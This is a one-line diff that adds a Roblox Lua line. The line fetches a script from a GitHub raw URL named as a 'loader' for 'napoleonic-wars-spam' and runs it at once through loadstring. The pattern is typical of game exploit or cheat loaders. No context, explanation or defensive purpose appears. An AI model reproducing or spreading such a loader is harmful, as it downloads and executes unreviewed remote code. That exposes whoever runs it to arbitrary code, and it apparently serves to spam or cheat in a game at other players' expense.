@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Frontierpifurnace41/loaders/main/loaders/napoleonic-wars-spam7-1z42optuo169wv.lua"))()
